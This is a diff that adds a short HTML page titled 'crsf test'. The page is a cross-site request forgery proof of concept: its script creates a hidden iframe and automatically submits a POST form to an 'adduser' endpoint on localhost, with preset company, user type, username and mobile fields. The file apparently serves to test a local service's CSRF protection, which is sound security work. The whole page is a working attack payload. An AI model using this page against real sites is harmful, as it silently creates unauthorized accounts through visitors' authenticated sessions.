@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset=utf-8>
+</head>
+
+<body>
+	<h2>crsf test</h2>
+
+
+	<script type="text/javascript">
+
+     var iframe = document.createElement("iframe");
+    var uniqueString = "UNIQUE_STRING";
+    document.body.appendChild(iframe);
+    iframe.style.display = "none";
+    iframe.contentWindow.name = uniqueString;
+    // construct a form with hidden inputs, targeting the iframe
+    var form = document.createElement("form");
+    form.target = uniqueString;
+    form.action = "http://localhost:6008/service/user/adduser";
+    form.method = "POST";
+    form.innerHTML=`<input type="text" name="companyid" value="be_eEZR2V3Fh">
+                                        <input type="text" name="usertype" value="0">
+                                        <input type="text" name="cnlid" value="0002">
+                                        <input type="text" name="username" value="111">
+                                        <input type="text" name="mobile" value="18112111111">`
+    form.submit();
+</script>
+</body>
+
+</html>
